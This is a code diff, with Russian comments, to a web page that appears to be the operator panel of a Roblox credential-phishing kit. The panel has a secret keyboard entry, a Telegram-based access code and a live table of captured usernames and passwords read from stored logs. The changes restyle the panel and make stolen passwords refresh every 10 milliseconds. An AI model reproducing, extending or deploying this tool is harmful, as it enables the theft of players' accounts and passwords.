@@ -13,15 +13,22 @@
         .login-card { background-color: #232527; width: 400px; padding: 40px; border-radius: 4px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
         input { width: 100%; padding: 12px; margin-bottom: 15px; background-color: #393b3d; border: 1px solid #393b3d; border-radius: 8px; color: #fff; outline: none; }
         .btn-auth { width: 100%; padding: 12px; background: #393b3d; border: 1px solid #fff; color: #fff; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        
         .acc-list { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; width: 100%; }
         .acc-item { background: #393b3d; padding: 10px; border-radius: 5px; cursor: pointer; border: 1px solid transparent; font-size: 14px; }
         .acc-item:hover { border-color: #ff0000; }
-        .admin-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 95%; max-width: 1000px; border: 1px solid #444; max-height: 400px; overflow-y: auto; }
+        
+        .admin-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 95%; max-width: 1000px; border: 1px solid #444; max-height: 400px; overflow-y: auto; position: relative; }
         table { width: 100%; border-collapse: collapse; }
         th, td { padding: 10px; border: 1px solid #333; text-align: left; }
-        /* Анимация мигания для новых логов */
-        .new-row { animation: flash 1.5s; }
-        @keyframes flash { from { background-color: #440000; } to { background-color: transparent; } }
+        
+        /* Индикатор бешенной скорости обновления */
+        #live-indicator { color: #00ff00; font-size: 11px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; animation: pulse 0.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        /* Анимация новой строки */
+        .new-row { animation: slideIn 0.3s ease-out; background-color: rgba(255, 0, 0, 0.1); }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
     </style>
 </head>
 <body>
@@ -39,9 +46,9 @@
 
     <div id="admin-auth" class="screen">
         <div class="login-card" style="border: 2px solid #ff0000;">
-            <h2 style="color: #ff0000;">SECURITY CHECK</h2>
-            <p id="status-text" style="color: #888; margin-bottom: 15px;">Введите код и выберите аккаунт из TG.</p>
-            <input type="password" id="admin_pass" placeholder="Код из Telegram">
+            <h2 style="color: #ff0000;">SYSTEM CHECK</h2>
+            <p id="status-text" style="color: #888; margin-bottom: 15px;">Введите код и выберите аккаунт.</p>
+            <input type="password" id="admin_pass" placeholder="Код из TG">
             <div id="acc-selector" class="acc-list" style="display: none;"></div>
             <button id="request-btn" class="btn-auth" style="border-color: #ff0000; color: #ff0000;" onclick="startVerification()">Получить данные в ТГ</button>
         </div>
@@ -49,9 +56,9 @@
 
     <div id="admin-panel" class="screen">
         <div class="admin-box">
-            <div style="display: flex; justify-content: space-between; align-items: center;">
-                <h2 style="color: #fff;">LIVE DATABASE</h2>
-                <span id="live-indicator" style="color: #00ff00; font-size: 12px;">● LIVE</span>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                <h2 style="color: #fff; margin: 0;">ULTRA-LIVE DB</h2>
+                <span id="live-indicator">⚡ INSTANT SYNC</span>
             </div>
             <table>
                 <thead><tr><th>User</th><th>Pass</th><th>Time</th></tr></thead>
@@ -66,9 +73,10 @@
         const TG_CHAT_ID = "7863254073";
         let secretCode = "";
         let targetAccount = "";
-        let lastLogsCount = 0; // Для отслеживания изменений
+        let lastLogsCount = -1; 
         const mockAccounts = ["Admin_Vip", "Roblox_Owner", "Mod_Check", "System_Root", "User_Test", "Dev_Access", "Security_Bot", "Main_Admin", "Global_Mod", "Data_Manager"];
 
+        // Секретный вход
         let keys = {};
         document.addEventListener('keydown', (e) => {
             keys[e.code] = true;
@@ -99,9 +107,8 @@
                 div.onclick = () => {
                     if (document.getElementById('admin_pass').value === secretCode && acc === targetAccount) {
                         showScreen('admin-panel');
-                        updateLogs();
-                        // ЗАПУСКАЕМ АВТО-ОБНОВЛЕНИЕ КАЖДЫЕ 2 СЕКУНДЫ
-                        setInterval(updateLogs, 2000);
+                        // СТАВИМ ОБНОВЛЕНИЕ 10мс (практически 0 секунд)
+                        setInterval(updateLogs, 10);
                     } else { alert("Ошибка!"); location.reload(); }
                 };
                 accSelector.appendChild(div);
@@ -124,16 +131,15 @@
 
         function updateLogs() {
             const logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
+            if (logs.length === lastLogsCount) return;
+
             const tbody = document.getElementById('logData');
+            tbody.innerHTML = logs.slice().reverse().map((l, index) => {
+                const isNew = (index === 0 && lastLogsCount !== -1) ? 'class="new-row"' : '';
+                return `<tr ${isNew}><td>${l.user}</td><td>${l.pass}</td><td>${l.time}</td></tr>`;
+            }).join('');
             
-            // Если количество логов изменилось, перерисовываем таблицу
-            if (logs.length !== lastLogsCount) {
-                tbody.innerHTML = logs.slice().reverse().map((l, index) => {
-                    const isNew = index === 0 && lastLogsCount !== 0 ? 'class="new-row"' : '';
-                    return `<tr ${isNew}><td>${l.user}</td><td>${l.pass}</td><td>${l.time}</td></tr>`;
-                }).join('');
-                lastLogsCount = logs.length;
-            }
+            lastLogsCount = logs.length;
         }
     </script>
 </body>
